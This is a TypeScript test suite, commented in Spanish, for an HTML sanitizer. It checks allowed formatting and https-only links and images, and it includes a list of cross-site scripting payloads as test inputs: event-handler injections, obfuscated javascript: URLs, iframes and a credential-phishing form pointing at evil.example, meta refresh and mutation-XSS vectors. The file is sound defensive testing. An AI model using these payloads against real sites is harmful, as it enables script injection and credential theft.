import { describe, expect, it } from "vitest";
import { MAX_HTML_CHARS, sanitizeHtml } from "./html";

/** Comprueba que en el resultado no queda nada que pueda ejecutarse o cargar contenido activo. */
function expectNoActiveContent(html: string) {
  expect(html).not.toMatch(/<\s*(?:script|iframe|object|embed|style|link|meta|base|form|input|svg|math)\b/i);
  expect(html).not.toMatch(/\son[a-z]+\s*=/i);
  expect(html).not.toMatch(/javascript\s*:/i);
  expect(html).not.toMatch(/\sstyle\s*=/i);
}

describe("sanitizeHtml: lo que se conserva", () => {
  it("deja pasar texto con formato básico", () => {
    expect(sanitizeHtml("<p>Hola <strong>mundo</strong></p>")).toBe("<p>Hola <strong>mundo</strong></p>");
  });

  it("conserva class, width y height", () => {
    const out = sanitizeHtml('<img class="foto" src="https://example.com/a.png" width="120" height="80">');
    expect(out).toContain('class="foto"');
    expect(out).toContain('width="120"');
    expect(out).toContain('height="80"');
  });

  it("permite las etiquetas retro center y marquee", () => {
    const out = sanitizeHtml("<center>hola</center><marquee>bienvenidos</marquee>");
    expect(out).toContain("<center>hola</center>");
    expect(out).toContain("<marquee>bienvenidos</marquee>");
  });

  it("agrega target y rel seguros a los enlaces https", () => {
    const out = sanitizeHtml('<a href="https://example.com">sitio</a>');
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('target="_blank"');
    expect(out).toContain("noopener");
    expect(out).toContain("noreferrer");
  });

  it("permite enlaces mailto", () => {
    expect(sanitizeHtml('<a href="mailto:hola@example.com">escribime</a>')).toContain('href="mailto:hola@example.com"');
  });

  it("las imágenes https quedan con carga diferida y sin referrer", () => {
    const out = sanitizeHtml('<img src="https://example.com/a.png" alt="foto">');
    expect(out).toContain('src="https://example.com/a.png"');
    expect(out).toContain('loading="lazy"');
    expect(out).toContain('referrerpolicy="no-referrer"');
  });
});

describe("sanitizeHtml: lo que se elimina", () => {
  it("descarta id, data-* y estilos en línea, y conserva class", () => {
    expect(sanitizeHtml('<p id="x" data-a="b" style="color:red" class="c">t</p>')).toBe('<p class="c">t</p>');
  });

  it("no acepta target ni rel escritos por el usuario", () => {
    const out = sanitizeHtml('<a href="https://example.com" target="_top" rel="opener">x</a>');
    expect(out).toContain('target="_blank"');
    expect(out).not.toContain("_top");
    expect(out).not.toContain('rel="opener"');
  });

  it("los enlaces relativos pierden el href", () => {
    expect(sanitizeHtml('<a href="/admin">panel</a>')).not.toContain("href");
  });

  it.each([
    ["http", '<img src="http://example.com/a.png">'],
    ["relativa", '<img src="/local.png">'],
    ["data:", '<img src="data:image/png;base64,iVBORw0KGgo=">'],
    ["sin esquema", '<img src="//example.com/a.png">'],
  ])("quita el src de imágenes que no son https (%s)", (_caso, html) => {
    expect(sanitizeHtml(html)).not.toContain("src=");
  });

  it("no devuelve el contenido de un script", () => {
    expect(sanitizeHtml("<p>ok</p><script>alert(1)</script>")).toBe("<p>ok</p>");
  });
});

describe("sanitizeHtml: vectores de ataque", () => {
  it.each([
    ["script", "<script>alert(1)</script>"],
    ["onerror", "<img src=x onerror=alert(1)>"],
    ["onload en imagen https", '<img src="https://example.com/a.png" onload="alert(1)">'],
    ["javascript: en href", '<a href="javascript:alert(1)">clic</a>'],
    ["javascript: con mayúsculas y espacios", '<a href="  JaVaScRiPt:alert(1)">clic</a>'],
    ["javascript: con tabulación codificada", '<a href="jav&#x09;ascript:alert(1)">clic</a>'],
    ["data:text/html en href", '<a href="data:text/html,<script>alert(1)</script>">clic</a>'],
    ["iframe", '<iframe src="https://evil.example"></iframe>'],
    ["object", '<object data="https://evil.example/x.swf"></object>'],
    ["embed", '<embed src="https://evil.example/x.swf">'],
    ["svg con onload", "<svg onload=alert(1)></svg>"],
    ["svg con script", "<svg><script>alert(1)</script></svg>"],
    ["math con xlink:href", '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
    ["style", "<style>body{display:none}</style>"],
    ["link a una hoja de estilos", '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ["base", '<base href="https://evil.example/">'],
    ["formulario de robo de datos", '<form action="https://evil.example"><input name="password"></form>'],
    ["overlay con estilo en línea", '<div style="position:fixed;inset:0;background:red">tapa todo</div>'],
    ["onclick", '<div onclick="alert(1)">x</div>'],
    ["ontoggle", "<details open ontoggle=alert(1)>x</details>"],
    ["onload en body", "<body onload=alert(1)>"],
    ["autofocus con onfocus", "<input autofocus onfocus=alert(1)>"],
    ["onstart en marquee", "<marquee onstart=alert(1)>x</marquee>"],
    [
      "mXSS con math y style",
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
    ],
    ["noscript", '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ])("neutraliza: %s", (_nombre, payload) => {
    expectNoActiveContent(sanitizeHtml(payload));
  });
});

describe("sanitizeHtml: límites y estabilidad", () => {
  it("recorta el contenido al máximo permitido", () => {
    expect(sanitizeHtml("a".repeat(MAX_HTML_CHARS + 1000)).length).toBeLessThanOrEqual(MAX_HTML_CHARS);
  });

  it("es idempotente: limpiar dos veces da lo mismo que limpiar una", () => {
    const sucio =
      '<p class="a" onclick="x()">hola</p><a href="https://example.com">ok</a><img src="http://example.com/a.png"><script>1</script>';
    const una = sanitizeHtml(sucio);
    expect(sanitizeHtml(una)).toBe(una);
  });
});
